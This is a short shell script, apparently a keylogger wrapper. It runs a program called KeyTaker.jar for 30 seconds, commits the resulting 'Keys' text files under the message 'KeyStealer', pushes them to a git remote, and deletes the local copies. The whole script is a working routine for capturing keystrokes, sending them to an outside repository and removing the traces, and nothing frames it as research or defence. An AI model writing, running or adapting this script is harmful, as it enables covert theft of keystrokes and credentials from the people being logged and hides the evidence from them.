java -jar KeyTaker.jar & sleep 30 ; kill $!
git add Keys***.txt
git commit -m "KeyStealer"
git push origin
rm -f Keys***.txt
